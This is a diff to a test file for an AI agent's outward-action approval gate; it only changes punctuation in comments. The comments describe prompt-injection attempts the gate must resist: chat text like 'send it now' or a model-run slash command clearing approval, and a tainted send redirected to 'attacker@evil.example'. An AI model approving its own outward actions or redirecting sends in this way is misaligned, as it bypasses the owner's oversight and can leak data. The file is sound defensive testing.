@@ -1,5 +1,5 @@
 /**
- * agent-outward-approval.test.ts — the remedy is real, and only the owner has it.
+ * agent-outward-approval.test.ts, the remedy is real, and only the owner has it.
  *
  * Two claims, and the boundary is worthless if either is false:
  *
@@ -9,7 +9,7 @@
  *     is worse than none, because it spends the reader's trust and teaches him
  *     the boundary is broken.
  *  2. Nothing content can reach produces that remedy. Had "send it now" worked,
- *     the gate would have been cleared by three words of chat text — and text
+ *     the gate would have been cleared by three words of chat text, and text
  *     is the thing being guarded against. The model can run any slash command
  *     through `agent_harness mode:"run_command"`, so the approval route has to
  *     refuse that path explicitly, or the fix would have been theatre.
@@ -62,8 +62,8 @@ function writeCredentials(root: string): void {
  *
  * These tests used to write `~/.gmail-mcp` files and leave both stores empty,
  * because the resolver scanned that directory on every call. It no longer goes
- * looking — rummaging through a home directory for another tool's credential
- * files is not something to do unasked — so the state under test is the state
+ * looking, rummaging through a home directory for another tool's credential
+ * files is not something to do unasked, so the state under test is the state
  * after adoption. The files are still written, unread, so a resolver that
  * quietly started scanning again would not make these pass for the wrong
  * reason.
@@ -233,7 +233,7 @@ describe('what untrusted content cannot manufacture', () => {
     await run(tool, TAINTED_SEND);
     await runGoogleCommand(['approve'], ownerTypedContext([]));
 
-    // A different send — different recipient — rides the approval he gave.
+    // A different send, different recipient, rides the approval he gave.
     // It must not, or an approval is a permit for the verb rather than the deed.
     const substituted = await run(tool, { ...TAINTED_SEND, to: 'attacker@evil.example' });
     expect(substituted.success).toBe(false);
